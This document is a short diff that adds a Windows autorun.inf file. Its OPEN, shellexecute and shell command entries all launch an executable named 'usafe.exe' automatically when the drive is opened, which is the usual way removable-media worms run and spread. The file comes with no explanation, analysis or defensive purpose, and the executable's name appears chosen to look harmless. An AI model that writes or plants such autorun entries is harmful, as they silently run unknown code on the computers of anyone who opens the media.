@@ -1,0 +1,4 @@
+[AutoRun]
+OPEN=usafe.exe
+shellexecute=usafe.exe
+shell\Auto\command=usafe.exe
